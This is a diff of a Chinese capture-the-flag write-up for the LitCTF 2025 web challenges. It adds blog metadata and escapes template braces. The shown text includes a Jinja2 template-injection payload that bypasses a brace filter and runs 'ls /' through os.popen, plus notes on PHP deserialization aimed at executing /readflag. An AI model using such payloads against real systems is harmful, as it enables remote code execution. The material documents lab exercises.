@@ -1,7 +1,11 @@
 ---
-title: LitCTF2025（公开赛道）（web
+title: LitCTF 2025 公开赛道 Web
 date: 2025-08-30 18:19:31
 author: Xendr1a
+categories: [CTF题解, LitCTF]
+tags: [LitCTF, Writeup]
+description: LitCTF2025（公开赛道）（web，题目思路与 payload 记录。
+toc: true
 ---
 
 # LitCTF2025（公开赛道）（web
@@ -25,14 +29,14 @@ author: Xendr1a
 
 ## 星愿信箱
 
-需要包含文字，过滤了{{吧，我们用{%绕过了，没有回显我们就加print这样
+需要包含文字，过滤了{% raw %}{{{% endraw %}吧，我们用{% raw %}{%{% endraw %}绕过了，没有回显我们就加print这样
 
 ![](/img/LitCTF2025-公开赛道-web/b001abb5-197f-4715-a593-f3bcfcafda6a-1024x630-20260331204447-wophb33.png)
 
 然后用的是
 
-```
-<code>{%print(lipsum.<strong>globals</strong>.<strong>builtins</strong>.<strong>import</strong>('os').popen('ls /
+```text
+<code>{% raw %}{%{% endraw %}print(lipsum.<strong>globals</strong>.<strong>builtins</strong>.<strong>import</strong>('os').popen('ls /
 ').read())%}</code>
 ```
 
@@ -483,7 +487,7 @@ if(!preg_match("/^[Oa]:[\d]+/i", $Litctf2025)){
 
 我们的主要目的应该就是create_function("", 'die(`/readflag`);');，create_function()是用来创建匿名函数的，看到把O改成C很容易想到原生类[https://chenxi9981.github.io/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9B%B8%E5%85%B3](https://chenxi9981.github.io/php反序列化/#原生类相关)
 
-```
+```text
 ArrayObject::unserialize
 ArrayIterator::unserialize
 RecursiveArrayIterator::unserialize
